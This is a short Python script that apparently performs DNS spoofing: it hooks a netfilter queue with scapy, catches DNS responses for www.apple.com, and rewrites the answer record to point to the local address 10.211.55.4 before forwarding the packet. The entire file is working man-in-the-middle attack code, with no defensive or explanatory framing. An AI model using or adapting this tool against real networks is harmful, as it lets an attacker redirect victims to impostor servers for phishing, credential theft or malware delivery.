#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.apple.com' in str(qname):
            print('[+] Spoofing target.')
            answer = scapy.DNSRR(rrname=qname, rdata='10.211.55.4')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            print(scapy_packet.show())

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    # packet.drop()
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
